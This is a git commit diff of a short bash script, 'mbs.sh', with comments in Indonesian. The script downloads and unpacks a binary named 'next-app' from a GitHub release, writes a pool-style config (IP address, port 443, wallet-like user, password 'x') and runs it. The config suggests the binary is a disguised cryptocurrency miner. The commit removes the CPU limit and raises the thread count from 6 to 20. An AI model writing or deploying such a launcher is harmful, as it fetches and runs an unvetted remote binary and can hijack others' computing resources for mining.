d5917cb896401639742a3f67bef542ecba753a9a
barburonjilo <barburonjilo@outlook.co.id>
2025-07-24 13:44:43 +0700

    Update mbs.sh

--- mbs.sh
+++ mbs.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 echo "Dimulai pada $(date)"
-apt install cpulimit
+# apt install cpulimit
 # Bersihkan proses sebelumnya
 pkill -f next-app
 rm -rf next-app.tar.gz
@@ -9,6 +9,6 @@ wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
 
 tar -xf next-app.tar.gz
 
-echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 6}' > config.json
-
-cpulimit --limit 450 -- ./next-app/next-app
+echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 20}' > config.json
+./next-app/next-app
+# cpulimit --limit 450 -- ./next-app/next-app
